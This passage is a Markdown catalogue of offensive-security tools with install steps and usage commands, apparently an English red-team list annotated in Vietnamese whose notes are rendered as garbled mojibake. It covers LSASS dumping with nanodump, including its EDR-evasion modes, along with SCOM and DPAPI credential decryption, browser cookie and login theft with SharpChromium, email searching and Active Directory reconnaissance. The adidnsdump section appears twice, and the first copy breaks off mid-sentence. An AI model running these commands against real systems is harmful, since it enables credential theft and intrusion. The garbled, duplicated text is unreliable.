**LÆ°u Ã½:** Cháº¡y hÃ m `Invoke-SCOMDecrypt` (náº¿u Ä‘Ã£ import script) hoáº·c tá»‡p thá»±c thi **SCOMDecrypt.exe**. CÃ´ng cá»¥ nÃ y tá»± Ä‘á»™ng Ä‘á»c khÃ³a giáº£i mÃ£ tá»« registry vÃ  káº¿t ná»‘i tá»›i database **SCOM** Ä‘á»ƒ trÃ­ch xuáº¥t vÃ  giáº£i mÃ£ thÃ´ng tin xÃ¡c thá»±c **RunAs** (thÆ°á»ng lÃ  tÃ i khoáº£n cÃ³ quyá»n cao Ä‘Æ°á»£c cáº¥u hÃ¬nh Ä‘á»ƒ cháº¡y cÃ¡c tÃ¡c vá»¥ tá»± Ä‘á»™ng trong **SCOM**). Cháº¡y trÃªn **SCOM server** vá»›i quyá»n quáº£n trá»‹.

*VÄƒn báº£n hÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://github.com/nccgroup/SCOMDecrypt*

### [ğŸ”™](#tool-list)[**nanodump**](https://github.com/helpsystems/nanodump)

The **LSASS** (Local Security Authority Subsystem Service) is a system process in the **Windows** operating system that is responsible for enforcing the security policy on the system. It is responsible for a number of tasks related to security, including authenticating users for logon, enforcing security policies, and generating audit logs.

Creating a **dump** of this process can allow an attacker to extract password hashes or other sensitive information from the process's memory, which could be used to compromise the system further.

This allows for the creation of a **minidump** of the **LSASS process**.

**Install:**

```bash
git clone https://github.com/helpsystems/nanodump.git
```
**LÆ°u Ã½:** Táº£i mÃ£ nguá»“n. CÃ´ng cá»¥ nÃ y Ä‘Æ°á»£c viáº¿t báº±ng **C**.

**Install (Linux with MinGW):**

```bash
make -f Makefile.mingw
```
**LÆ°u Ã½:** BiÃªn dá»‹ch mÃ£ nguá»“n C báº±ng **`make`** vá»›i **Makefile.mingw** trÃªn há»‡ thá»‘ng **Linux** sá»­ dá»¥ng **MinGW** cross-compiler, cho phÃ©p táº¡o tá»‡p thá»±c thi cho **Windows** tá»« mÃ´i trÆ°á»ng **Linux**.

**Install (**Windows** with MSVC):**

```bash
nmake -f Makefile.msvc
```
**LÆ°u Ã½:** BiÃªn dá»‹ch mÃ£ nguá»“n C báº±ng **`nmake`** vá»›i **Makefile.msvc** trong mÃ´i trÆ°á»ng phÃ¡t triá»ƒn **Visual Studio** trÃªn **Windows**.

**Install (CobaltStrike only):**

Import the `NanoDump.cna` script on **Cobalt Strike**.
**LÆ°u Ã½:** Náº¿u sá»­ dá»¥ng **framework C2 Cobalt Strike**, cÃ³ má»™t script `.cna` cÃ³ thá»ƒ Ä‘Æ°á»£c import Ä‘á»ƒ tÃ­ch há»£p **NanoDump** trá»±c tiáº¿p vÃ o **beacon**, cho phÃ©p cháº¡y nÃ³ trong bá»™ nhá»› hoáº·c qua cÃ¡c ká»¹ thuáº­t khÃ¡c do **Cobalt Strike** há»— trá»£.

Full installation information can be found [táº¡i Ä‘Ã¢y](https://github.com/helpsystems/nanodump).

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Run
nanodump.x64.exe

# Leverage the Silent Process Exit technique
nanodump --silent-process-exit C:\Windows\Temp\

# Leverage the Shtinkering technique
nanodump --shtinkering
```
**LÆ°u Ã½:** Cháº¡y tá»‡p thá»±c thi **nanodump**. **Nanodump** Ä‘Æ°á»£c thiáº¿t káº¿ Ä‘á»ƒ **dump** bá»™ nhá»› cá»§a tiáº¿n trÃ¬nh **LSASS** trÃªn **Windows** má»™t cÃ¡ch an toÃ n hÆ¡n so vá»›i cÃ¡c ká»¹ thuáº­t khÃ¡c, trÃ¡nh bá»‹ **EDR** phÃ¡t hiá»‡n báº±ng cÃ¡ch sá»­ dá»¥ng cÃ¡c ká»¹ thuáº­t thay tháº¿ (vÃ­ dá»¥: Silent Process Exit, Shtinkering). Báº¡n cÃ³ thá»ƒ chá»‰ Ä‘á»‹nh ká»¹ thuáº­t vÃ  nÆ¡i lÆ°u file dump. File dump nÃ y sau Ä‘Ã³ cÃ³ thá»ƒ Ä‘Æ°á»£c crack báº±ng **Mimikatz** hoáº·c cÃ¡c cÃ´ng cá»¥ khÃ¡c Ä‘á»ƒ láº¥y thÃ´ng tin xÃ¡c thá»±c. Cáº§n quyá»n quáº£n trá»‹ viÃªn hoáº·c quyá»n `SeDebugPrivilege`.

Full usage information can be found [táº¡i Ä‘Ã¢y](https://github.com/helpsystems/nanodump#1-usage).

![nanodump](https://user-images.githubusercontent.com/100603074/210985548-a5e69f62-04da-4771-b06b-720147de08d0.jpg)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://github.com/helpsystems/nanodump*

### [ğŸ”™](#tool-list)[**eviltree**](https://github.com/t3l3machus/eviltree)

A standalone python3 remake of the classic "tree" command with the additional feature of searching for user provided keywords/regex in files, highlighting those that contain matches. Created for two main reasons:

- While searching for secrets in files of nested directory structures, being able to visualize which files contain user provided keywords/regex patterns and where those files are located in the hierarchy of folders, provides a significant advantage.
- `tree` is an amazing tool for analyzing directory structures. It's really handy to have a standalone alternative of the command for **post-exploitation enumeration** as it is not pre-installed on every **linux** distro and is kind of limited on **Windows** (compared to the UNIX version).

**Install:**

```bash
git clone https://github.com/t3l3machus/eviltree
```
**LÆ°u Ã½:** CÃ i Ä‘áº·t báº±ng **Git**.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Running a regex that essentially matches strings similar to: password = something against /var/www
python3 eviltree.py -r /var/www -x ".{0,3}passw.{0,3}[=]{1}.{0,18}" -v

# Using comma separated keywords instead of regex
python3 eviltree.py -r C:\Users\USERNAME -k passw,admin,account,login,user -L 3 -v
```
**LÆ°u Ã½:** CÃ¡c vÃ­ dá»¥ sá»­ dá»¥ng **script Python eviltree.py**. `-r` chá»‰ Ä‘á»‹nh thÆ° má»¥c gá»‘c Ä‘á»ƒ duyá»‡t. `-x` chá»‰ Ä‘á»‹nh regex Ä‘á»ƒ tÃ¬m kiáº¿m trong ná»™i dung file. `-k` chá»‰ Ä‘á»‹nh danh sÃ¡ch cÃ¡c tá»« khÃ³a (ngÄƒn cÃ¡ch bá»Ÿi dáº¥u pháº©y) Ä‘á»ƒ tÃ¬m kiáº¿m. `-v` báº­t cháº¿ Ä‘á»™ chi tiáº¿t. `-L` giá»›i háº¡n Ä‘á»™ sÃ¢u cá»§a thÆ° má»¥c. CÃ´ng cá»¥ nÃ y há»¯u Ã­ch Ä‘á»ƒ khÃ¡m phÃ¡ cÃ¡c file chá»©a thÃ´ng tin nháº¡y cáº£m (nhÆ° máº­t kháº©u) trong má»™t há»‡ thá»‘ng Ä‘Ã£ bá»‹ xÃ¢m nháº­p (**Linux** hoáº·c **Windows**).

![image](https://user-images.githubusercontent.com/100603074/212204831-9887b976-dee8-4520-bbd6-e6e69da711ed.png)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://github.com/t3l3machus/eviltree*

### [ğŸ”™](#tool-list)[**SeeYouCM-Thief**](https://github.com/trustedsec/SeeYouCM-Thief)

Simple tool to automatically download and parse configuration files from **Cisco phone systems** searching for SSH credentials.

Will also optionally enumerate active directory users from the UDS API.

[Blog - Exploiting common misconfigurations in cisco phone systems](https://www.trustedsec.com/blog/seeyoucm-thief-exploiting-common-misconfigurations-in-cisco-phone-systems/)

**Install:**

```bash
git clone https://github.com/trustedsec/SeeYouCM-Thief
python3 -m pip install -r requirements.txt
```
**LÆ°u Ã½:** CÃ i Ä‘áº·t báº±ng **Git** vÃ  **Python** vá»›i cÃ¡c dependency cáº§n thiáº¿t.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Enumerate Active Directory users from the UDS api on the CUCM
./thief.py -H <CUCM server> --userenum

# Without specifying a phone IP address the script will attempt to download every config in the listing.
./thief.py -H <Cisco CUCM Server> [--verbose]

# Parse the web interface for the CUCM address and will do a reverse lookup for other phones in the same subnet.
./thief.py --phone <Cisco IP Phoner> [--verbose]

# Specify a subnet to scan with reverse lookups.
./thief.py --subnet <subnet to scan> [--verbose]
```
**LÆ°u Ã½:** Sá»­ dá»¥ng **script Python thief.py**. NÃ³ nháº¯m vÃ o cÃ¡c server Cisco Unified Communications Manager (**CUCM**) vÃ  cÃ¡c Ä‘iá»‡n thoáº¡i IP cá»§a Cisco. `--userenum` Ä‘á»ƒ liá»‡t kÃª ngÆ°á»i dÃ¹ng AD qua API cá»§a **CUCM**. `-H` chá»‰ Ä‘á»‹nh server CUCM. `--phone` hoáº·c `--subnet` chá»‰ Ä‘á»‹nh cÃ¡c Ä‘iá»‡n thoáº¡i má»¥c tiÃªu Ä‘á»ƒ cá»‘ gáº¯ng táº£i file cáº¥u hÃ¬nh vá». CÃ´ng cá»¥ nÃ y khai thÃ¡c cÃ¡c cáº¥u hÃ¬nh máº·c Ä‘á»‹nh/yáº¿u phá»• biáº¿n trÃªn cÃ¡c há»‡ thá»‘ng Ä‘iá»‡n thoáº¡i Cisco Ä‘á»ƒ láº¥y thÃ´ng tin nháº¡y cáº£m nhÆ° SSH credential tá»« file cáº¥u hÃ¬nh hoáº·c liá»‡t kÃª ngÆ°á»i dÃ¹ng.

![image](https://user-images.githubusercontent.com/100603074/212204860-a20c83dd-a4f7-4c6f-a760-5925d4ae1e03.png)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://www.trustedsec.com/blog/seeyoucm-thief-exploiting-common-misconfigurations-in-cisco-phone-systems/*

### [ğŸ”™](#tool-list)[**MailSniper**](https://github.com/dafthack/MailSniper)

**MailSniper** is a penetration testing tool for searching through email in a **Microsoft Exchange** environment for specific terms (passwords, insider intel, network architecture information, etc.). It can be used as a non-administrative user to search their own email or by an **Exchange administrator** to search the mailboxes of every user in a domain.

**MailSniper** also includes additional modules for password spraying, enumerating users and domains, gathering the Global Address List (GAL) from OWA and EWS and checking mailbox permissions for every **Exchange** user at an organization.

Nice blog post with more information about [táº¡i Ä‘Ã¢y](https://www.blackhillsinfosec.com/introducing-mailsniper-a-tool-for-searching-every-users-email-for-sensitive-data/).

[**MailSniper** Field Manual](http://www.dafthack.com/files/MailSniper-Field-Manual.pdf)

**Install:**

```
git clone https://github.com/dafthack/MailSniper
cd MailSniper
Import-Module MailSniper.ps1
```
**LÆ°u Ã½:** Táº£i mÃ£ nguá»“n **script PowerShell**, di chuyá»ƒn vÃ o thÆ° má»¥c vÃ  import script nhÆ° má»™t module. CÃ´ng cá»¥ nÃ y cháº¡y trÃªn **Windows PowerShell**.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Search current users mailbox
Invoke-SelfSearch -Mailbox current-user@domain.com
```
**LÆ°u Ã½:** `Invoke-SelfSearch` lÃ  má»™t trong cÃ¡c hÃ m (**cmdlet**) cá»§a **MailSniper**. HÃ m nÃ y cho phÃ©p ngÆ°á»i dÃ¹ng hiá»‡n táº¡i quÃ©t há»™p thÆ° email cá»§a chÃ­nh há» trÃªn **Microsoft Exchange** Ä‘á»ƒ tÃ¬m cÃ¡c tá»« khÃ³a nháº¡y cáº£m. **MailSniper** cÃ³ nhiá»u cmdlet khÃ¡c cho cÃ¡c tÃ¡c vá»¥ phá»©c táº¡p hÆ¡n (vÃ­ dá»¥: quÃ©t toÃ n bá»™ domain náº¿u cÃ³ quyá»n admin Exchange, password spraying vÃ o OWA, ...).

![image](https://user-images.githubusercontent.com/100603074/217654320-3d74551c-e37a-4398-b354-a1ed7f982cd0.png)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://patrowl.io/*

### [ğŸ”™](#tool-list)[**SharpChromium**](https://github.com/djhohnstein/SharpChromium)

**SharpChromium** is a **.NET 4.0+ CLR project** to retrieve data from **Google Chrome, Microsoft Edge**, and **Microsoft Edge Beta**. Currently, it can extract:

- Cookies (in JSON format)
- History (with associated cookies for each history item)
- Saved Logins

This rewrite has several advantages to previous implementations, which include:

- No Type compilation or reflection required
- Cookies are displayed in JSON format, for easy importing into Cookie Editor.
- No downloading SQLite assemblies from remote resources.
- Supports major **Chromium browsers** (but extendable to others)

**Install:**

Using [Visual Studio Community Edition](https://visualstudio.microsoft.com/downloads/).

Open up the project .sln, choose "**release**", and **build**.
**LÆ°u Ã½:** BiÃªn dá»‹ch mÃ£ nguá»“n **C#** báº±ng **Visual Studio** Ä‘á»ƒ táº¡o file thá»±c thi **SharpChromium.exe**.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Retrieve cookies associated with Google Docs and Github
.\SharpChromium.exe cookies docs.google.com github.com

# Retrieve history items and their associated cookies.
.\SharpChromium.exe history

# Retrieve saved logins (Note: Only displays those with non-empty passwords):
.\SharpChromium.exe logins
```
**LÆ°u Ã½:** Sá»­ dá»¥ng **SharpChromium.exe** vá»›i cÃ¡c Ä‘á»‘i sá»‘ khÃ¡c nhau (`cookies`, `history`, `logins`). CÃ´ng cá»¥ nÃ y cháº¡y trÃªn **Windows** cá»¥c bá»™ nÆ¡i cÃ¡c trÃ¬nh duyá»‡t dá»±a trÃªn **Chromium** Ä‘Æ°á»£c cÃ i Ä‘áº·t. NÃ³ truy cáº­p cÃ¡c file cáº¥u hÃ¬nh cá»§a trÃ¬nh duyá»‡t Ä‘á»ƒ giáº£i mÃ£ vÃ  trÃ­ch xuáº¥t thÃ´ng tin nháº¡y cáº£m Ä‘Ã£ lÆ°u (thÆ°á»ng cáº§n cháº¡y dÆ°á»›i cÃ¹ng user profile vá»›i náº¡n nhÃ¢n hoáº·c vá»›i quyá»n Ä‘á»c cÃ¡c file Ä‘Ã³).

![image](https://user-images.githubusercontent.com/100603074/220959335-6e7a8275-bad9-4c3f-883f-2d7ab6749b75.png)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://github.com/djhohnstein/SharpChromium*

### [ğŸ”™](#tool-list)[**dploot**](https://github.com/zblurx/dploot)

**DPAPI** (Data Protection Application Programming Interface) provides a set of APIs to encrypt and decrypt data where a user password is typically used to set the 'master key' (in a user scenario). So to leverage **DPAPI** to gain access to certain data (**Chrome Cookies/Login Data, the Windows Credential Manager/Vault** etc) we just need access to a password.

**dploot** is **Python** rewrite of **SharpDPAPI** written un **C#** by Harmj0y, which is itself a port of **DPAPI** from **Mimikatz** by gentilkiwi. It implements all the **DPAPI** logic of these tools, but this time it is usable with a **python interpreter** and from a **Linux environment**.

[Blog - Operational Guidance for Offensive User DPAPI Abuse](https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107)

**Install (Pip):**

```bash
pip install dploot
```
**LÆ°u Ã½:** CÃ i Ä‘áº·t thÆ° viá»‡n **Python** **dploot**.

**Install (Git):**

```bash
git clone https://github.com/zblurx/dploot.git
cd dploot
make
```
**LÆ°u Ã½:** CÃ i Ä‘áº·t tá»« mÃ£ nguá»“n **Python** vÃ  sá»­ dá»¥ng **make** Ä‘á»ƒ chuáº©n bá»‹ cÃ¡c thÃ nh pháº§n cáº§n thiáº¿t (vÃ­ dá»¥: build module **C** náº¿u cÃ³).

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Loot decrypted machine private key files as a Windows local administrator
dploot machinecertificates -d waza.local -u Administrator -p 'Password!123' 192.168.56.14 -quiet

# Loot the DPAPI backup key as a Windows Domain Administrator (Will allow attacker to loot and decrypt any DPAPI protected password realted to a domain user)
dploot backupkey -d waza.local -u Administrator -p 'Password!123' 192.168.56.112 -quiet

# Leverage the DPAPI backup key `key.pvk` to loot any user secrets stored on Windows domain joined endpoints
dploot certificates -d waza.local -u Administrator -p 'Password!123' 192.168.56.14 -pvk key.pvk  -quiet
```
**LÆ°u Ã½:** Sá»­ dá»¥ng **script Python dploot**. CÃ¡c vÃ­ dá»¥ nÃ y minh há»a cÃ¡ch **dploot** Ä‘Æ°á»£c sá»­ dá»¥ng tá»« mÃ¡y attacker (thÆ°á»ng lÃ  **Linux**) Ä‘á»ƒ káº¿t ná»‘i Ä‘áº¿n mÃ¡y **Windows** má»¥c tiÃªu tá»« xa vÃ  trÃ­ch xuáº¥t cÃ¡c khÃ³a **DPAPI** (`machinecertificates`, `backupkey`) hoáº·c sá»­ dá»¥ng khÃ³a **DPAPI** Ä‘Ã£ thu tháº­p (`-pvk`) Ä‘á»ƒ giáº£i mÃ£ cÃ¡c bÃ­ máº­t khÃ¡c (`certificates`). `-d`, `-u`, `-p` cung cáº¥p thÃ´ng tin xÃ¡c thá»±c domain hoáº·c cá»¥c bá»™. Ká»¹ thuáº­t nÃ y khai thÃ¡c cÆ¡ cháº¿ báº£o vá»‡ dá»¯ liá»‡u cá»§a **Windows** (**DPAPI**) Ä‘á»ƒ láº¥y cÃ¡c bÃ­ máº­t Ä‘Æ°á»£c mÃ£ hÃ³a.

**Discovery**
====================

### [ğŸ”™](#tool-list)[**PCredz**](https://github.com/lgandx/PCredz)

This tool extracts **Credit card numbers, NTLM(DCE-RPC, HTTP, SQL, LDAP, etc), Kerberos (AS-REQ Pre-Auth etype 23), HTTP Basic, SNMP, POP, SMTP, FTP, IMAP**, etc from a **pcap file** or from a live interface.

**Install:**

```bash
git clone https://github.com/lgandx/PCredz
```
**LÆ°u Ã½:** CÃ i Ä‘áº·t báº±ng **Git**.

**CÃ¡ch sá»­ dá»¥ng:** (Full Usage [táº¡i Ä‘Ã¢y](https://github.com/lgandx/PCredz#usage))

**CÃ¡ch sá»­ dá»¥ng:** (PCAP File Folder)

```python
python3 ./Pcredz -d /tmp/pcap-directory-to-parse/
```
**LÆ°u Ã½:** Cháº¡y script **Python PCredz** vá»›i cá» `-d` Ä‘á»ƒ xá»­ lÃ½ táº¥t cáº£ cÃ¡c file `.pcap` trong má»™t thÆ° má»¥c. YÃªu cáº§u cÃ i Ä‘áº·t thÆ° viá»‡n `scapy` trong Python.

**CÃ¡ch sá»­ dá»¥ng:** (Live Capture)

```python
python3 ./Pcredz -i eth0 -v
```
**LÆ°u Ã½:** Cháº¡y **script PCredz** vá»›i cá» `-i` Ä‘á»ƒ láº¯ng nghe trÃªn giao diá»‡n máº¡ng cá»¥ thá»ƒ (`eth0`) vÃ  cá» `-v` Ä‘á»ƒ báº­t cháº¿ Ä‘á»™ chi tiáº¿t. YÃªu cáº§u quyá»n Ä‘á»§ Ä‘á»ƒ Ä‘á»c lÆ°u lÆ°á»£ng máº¡ng thÃ´ (raw packet), thÆ°á»ng cáº§n quyá»n root. NÃ³ phÃ¢n tÃ­ch cÃ¡c gÃ³i tin máº¡ng Ä‘á»ƒ trÃ­ch xuáº¥t thÃ´ng tin xÃ¡c thá»±c.

![image](https://user-images.githubusercontent.com/100603074/191007004-a0fd01f3-e01f-4bdb-b89e-887c85a7be91.png)

### [ğŸ”™](#tool-list)[**PingCastle**](https://github.com/vletoux/pingcastle)

**Ping Castle** is a tool designed to assess quickly the **Active Directory security level** with a methodology based on risk assessment and a maturity framework. It does not aim at a perfect evaluation but rather as an efficiency compromise.

**Install:** (Download)

```
https://github.com/vletoux/pingcastle/releases/download/2.11.0.1/PingCastle_2.11.0.1.zip
```
**LÆ°u Ã½:** Táº£i xuá»‘ng file zip chá»©a file thá»±c thi **PingCastle.exe**. ÄÃ¢y lÃ  cÃ´ng cá»¥ cháº¡y trÃªn **Windows**.

**CÃ¡ch sá»­ dá»¥ng:**

```python
./PingCastle.exe
```
**LÆ°u Ã½:** Cháº¡y tá»‡p thá»±c thi **PingCastle.exe**. CÃ´ng cá»¥ thÆ°á»ng tá»± Ä‘á»™ng phÃ¡t hiá»‡n **domain Active Directory** vÃ  thá»±c hiá»‡n Ä‘Ã¡nh giÃ¡ báº£o máº­t dá»±a trÃªn nhiá»u tiÃªu chÃ­, táº¡o ra má»™t bÃ¡o cÃ¡o chi tiáº¿t. Cáº§n cÃ³ quyá»n háº¡n nháº¥t Ä‘á»‹nh trong **domain** Ä‘á»ƒ thá»±c hiá»‡n cÃ¡c kiá»ƒm tra.

![image](https://user-images.githubusercontent.com/100603074/191008405-39bab2dc-54ce-43d1-aed7-53956776a9ef.png)

### [ğŸ”™](#tool-list)[**Seatbelt**](https://github.com/GhostPack/Seatbelt)

**Seatbelt** is a useful tool for gathering detailed information about the security posture of a target **Windows** machine in order to identify potential vulnerabilities and attack vectors.

It is designed to be run on a compromised victim machine to gather information about the current security configuration, including information about installed software, services, group policies, and other security-related settings

**Install (BiÃªn dá»‹ch):**

**Seatbelt** has been built against **.NET 3.5** and **4.0** with **C# 8.0** features and is compatible with [Visual Studio Community Edition](https://visualstudio.microsoft.com/downloads/).

Open up the project .sln, choose "**release**", and **build**.
**LÆ°u Ã½:** BiÃªn dá»‹ch mÃ£ nguá»“n C# báº±ng Visual Studio.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Run all checks and output to output.txt
Seatbelt.exe -group=all -full > output.txt

# Return 4624 logon events for the last 30 days
Seatbelt.exe "LogonEvents 30"

# Query the registry three levels deep, returning only keys/valueNames/values that match the regex .*defini.*
Seatbelt.exe "reg \"HKLM\SOFTWARE\Microsoft\Windows Defender\" 3 .*defini.* true"

# Run remote-focused checks against a remote system
Seatbelt.exe -group=remote -computername=192.168.230.209 -username=THESHIRE\sam -password="yum \"po-ta-toes\""
```
**LÆ°u Ã½:** Sá»­ dá»¥ng **cÃ´ng cá»¥ Seatbelt.exe** vá»›i cÃ¡c Ä‘á»‘i sá»‘ khÃ¡c nhau. `-group=all` cháº¡y táº¥t cáº£ cÃ¡c module kiá»ƒm tra thÃ´ng tin. `-full` bao gá»“m táº¥t cáº£ cÃ¡c kiá»ƒm tra chi tiáº¿t. Output thÆ°á»ng Ä‘Æ°á»£c chuyá»ƒn hÆ°á»›ng (`>`) ra file. **Seatbelt** cÃ³ cÃ¡c nhÃ³m lá»‡nh cá»¥ thá»ƒ (vÃ­ dá»¥: `LogonEvents`, `reg`) Ä‘á»ƒ thá»±c hiá»‡n cÃ¡c kiá»ƒm tra táº­p trung vÃ o cÃ¡c loáº¡i dá»¯ liá»‡u khÃ¡c nhau. CÃ³ thá»ƒ cháº¡y cá»¥c bá»™ hoáº·c tá»« xa (vá»›i thÃ´ng tin xÃ¡c thá»±c). CÃ´ng cá»¥ cháº¡y trÃªn **Windows** vÃ  ráº¥t há»¯u Ã­ch cho giai Ä‘oáº¡n **discovery** vÃ  **recon** cá»¥c bá»™ sau khi Ä‘Ã£ cÃ³ quyá»n truy cáº­p ban Ä‘áº§u.

Full command groups and parameters can be found [táº¡i Ä‘Ã¢y](https://github.com/GhostPack/Seatbelt#command-groups).

![image](https://user-images.githubusercontent.com/100603074/210137456-14eb3329-f29d-4ce1-a595-3466bd5a962f.png)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://exord66.github.io/csharp-in-memory-assemblies*

### [ğŸ”™](#tool-list)[**ADRecon**](https://github.com/sense-of-security/adrecon)

Great tool for gathering information about a victim's Microsoft **Active Directory (AD)** environment, with support for **Excel** outputs.

It can be run from any workstation that is connected to the environment, even hosts that are not domain members.

[BlackHat USA 2018 SlideDeck](https://speakerdeck.com/prashant3535/adrecon-bh-usa-2018-arsenal-and-def-con-26-demo-labs-presentation)

**Prerequisites**

- .NET Framework 3.0 or later (**Windows 7** includes 3.0)
- **PowerShell** 2.0 or later (**Windows 7** includes 2.0)

**Install (Git):**

```bash
git clone https://github.com/sense-of-security/ADRecon.git
```
**LÆ°u Ã½:** Táº£i mÃ£ nguá»“n **script PowerShell** báº±ng **Git**.

**Install (Download):**

You can download a zip archive of the [latest release](https://github.com/sense-of-security/adrecon/archive/master.zip).
**LÆ°u Ã½:** Táº£i xuá»‘ng file zip chá»©a script.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# To run ADRecon on a domain member host.
PS C:\> .\ADRecon.ps1

# To run ADRecon on a domain member host as a different user.
PS C:\>.\ADRecon.ps1 -DomainController <IP or FQDN> -Credential <domain\username>

# To run ADRecon on a non-member host using LDAP.
PS C:\>.\ADRecon.ps1 -Protocol LDAP -DomainController <IP or FQDN> -Credential <domain\username>

# To run ADRecon with specific modules on a non-member host with RSAT. (Default OutputType is STDOUT with -Collect parameter)
PS C:\>.\ADRecon.ps1 -Protocol ADWS -DomainController <IP or FQDN> -Credential <domain\username> -Collect Domain, DomainControllers
```
**LÆ°u Ã½:** CÃ¡c vÃ­ dá»¥ vá» cÃ¡ch cháº¡y **script PowerShell ADRecon.ps1**. Báº¡n cÃ³ thá»ƒ cháº¡y nÃ³ trÃªn mÃ¡y lÃ  thÃ nh viÃªn domain, mÃ¡y khÃ´ng pháº£i thÃ nh viÃªn domain (sá»­ dá»¥ng LDAP hoáº·c ADWS), vÃ  vá»›i thÃ´ng tin xÃ¡c thá»±c Ä‘Æ°á»£c chá»‰ Ä‘á»‹nh (`-Credential`). `ADRecon` tá»± Ä‘á»™ng thu tháº­p nhiá»u thÃ´ng tin khÃ¡c nhau vá» **Active Directory** vÃ  cÃ³ thá»ƒ xuáº¥t bÃ¡o cÃ¡o ra nhiá»u Ä‘á»‹nh dáº¡ng (vÃ­ dá»¥: file Excel) Ä‘á»ƒ phÃ¢n tÃ­ch dá»… dÃ ng. Há»¯u Ã­ch cho giai Ä‘oáº¡n **discovery** trong mÃ´i trÆ°á»ng **AD**.

Full usage and parameter information can be found [táº¡i Ä‘Ã¢y](https://github.com/sense-of-security/adrecon#usage).

![image](https://user-images.githubusercontent.com/100603074/210137064-2a0247b3-5d28-409a-904b-0fd9db87ef56.png)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://vk9-sec.com/domain-enumeration-powerview-adrecon/*

### [ğŸ”™](#tool-list)[**adidnsdump**](https://github.com/dirkjanm/adidnsdump)

By default any user in **Active Directory** can enumerate all DNS records in the **Domain or Forest DNS zones**, similar to a zone transfer.

This tool enables enumeration and exporting of all DNS records in the zone for **recon** purposes of internal networks.

**Install (Pip):**

```bash
pip install git+https://github.com/dirkjanm/adidnsdump#egg=adidnsdump
```
**LÆ°u Ã½:** CÃ i Ä‘áº·t **cÃ´ng cá»¥ Python adidnsdump** trá»±c tiáº¿p tá»« URL **GitHub** báº±ng pip.

**Install (Git):**

```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .
```
**LÆ°u Ã½:** CÃ i Ä‘áº·t tá»« mÃ£ nguá»“n báº±ng **Git** vÃ  pip.

**Note:** *The tool requires `impacket` and `dnspython` to function. While the tool works with both **Python 2** and **3, Python 3** support requires you to install [impacket from GitHub](https://github.com/CoreSecurity/impacket).*

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Display the zones in the domain where you are currently in
adidnsdump -u icorp\\testuser --print-zones icorp-dc.internal.corp

# Display all zones in the domain
adidnsdump -u icorp\\testuser icorp-dc.internal.corp

# Resolve all unknown records (-r)
adidnsdump -u icorp\\testuser icorp-dc.internal.corp -r
```
**LÆ°u Ã½:** Sá»­ dá»¥ng **cÃ´ng cá»¥ adidnsdump**. `-u` cung cáº¥p thÃ´ng tin xÃ¡c thá»±c user (`domain\username`) Ä‘á»ƒ káº¿t ná»‘i tá»›i Domain Controller

### [ğŸ”™](#tool-list)[**adidnsdump**](https://github.com/dirkjanm/adidnsdump)

By default any user in **Active Directory** can enumerate all DNS records in the **Domain or Forest DNS zones**, similar to a zone transfer.

This tool enables enumeration and exporting of all DNS records in the zone for **recon** purposes of internal networks.

**Install (Pip):**

```bash
pip install git+https://github.com/dirkjanm/adidnsdump#egg=adidnsdump
```
**LÆ°u Ã½:** CÃ i Ä‘áº·t **cÃ´ng cá»¥ Python adidnsdump** trá»±c tiáº¿p tá»« URL **GitHub** báº±ng pip.

**Install (Git):**

```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .
```
**LÆ°u Ã½:** CÃ i Ä‘áº·t tá»« mÃ£ nguá»“n báº±ng **Git** vÃ  pip.

**Note:** *The tool requires `impacket` and `dnspython` to function. While the tool works with both **Python 2** and **3, Python 3** support requires you to install [impacket from GitHub](https://github.com/CoreSecurity/impacket).*
**LÆ°u Ã½:** LÆ°u Ã½ quan trá»ng vá» cÃ¡c thÆ° viá»‡n **Python** phá»¥ thuá»™c (`impacket`, `dnspython`).

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Hiá»ƒn thá»‹ cÃ¡c zone trong domain hiá»‡n táº¡i
adidnsdump -u icorp\\testuser --print-zones icorp-dc.internal.corp

# Hiá»ƒn thá»‹ táº¥t cáº£ cÃ¡c zone trong domain
adidnsdump -u icorp\\testuser icorp-dc.internal.corp

# Resolve táº¥t cáº£ cÃ¡c báº£n ghi chÆ°a biáº¿t (-r)
adidnsdump -u icorp\\testuser icorp-dc.internal.corp -r
```
**LÆ°u Ã½:** Sá»­ dá»¥ng **cÃ´ng cá»¥ adidnsdump**. `-u` cung cáº¥p thÃ´ng tin xÃ¡c thá»±c user (`domain\username`) Ä‘á»ƒ káº¿t ná»‘i tá»›i Domain Controller (`icorp-dc.internal.corp`). `--print-zones` chá»‰ hiá»ƒn thá»‹ cÃ¡c zone cÃ³ sáºµn, bá» qua cÃ¡c báº£n ghi chi tiáº¿t. Cháº¡y khÃ´ng cÃ³ `--print-zones` sáº½ **dump** táº¥t cáº£ cÃ¡c báº£n ghi **DNS**. Cá» `-r` cá»‘ gáº¯ng resolve (tra cá»©u IP) cÃ¡c báº£n ghi Ä‘Æ°á»£c **dump**. Ká»¹ thuáº­t nÃ y dá»±a vÃ o cáº¥u hÃ¬nh máº·c Ä‘á»‹nh cá»§a **Active Directory** cho phÃ©p má»i ngÆ°á»i dÃ¹ng Ä‘á»c cÃ¡c báº£n ghi **DNS** cá»§a zone.

[Blog - Getting in the Zone: dumping Active Directory DNS using adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

